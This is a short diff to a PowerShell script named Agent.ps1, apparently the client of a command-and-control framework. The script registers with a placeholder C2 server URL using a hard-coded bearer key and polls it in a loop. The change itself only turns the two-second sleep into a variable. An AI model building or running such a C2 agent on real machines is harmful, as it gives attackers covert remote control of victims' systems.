@@ -1,6 +1,7 @@
 # Agent.ps1
 $C2_SERVER_IP = "http://C2-SERVER-IP:80"
 $auth = "MySecretKey123"
+$POLL_INTERVAL = 2
 
 # Register agent
 $response = Invoke-RestMethod -Uri "$C2_SERVER_IP/register" -Method Post -Headers @{Authorization="Bearer $auth"}
@@ -54,5 +55,5 @@ while ($true) {
         }
     }
 
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds $POLL_INTERVAL
 }
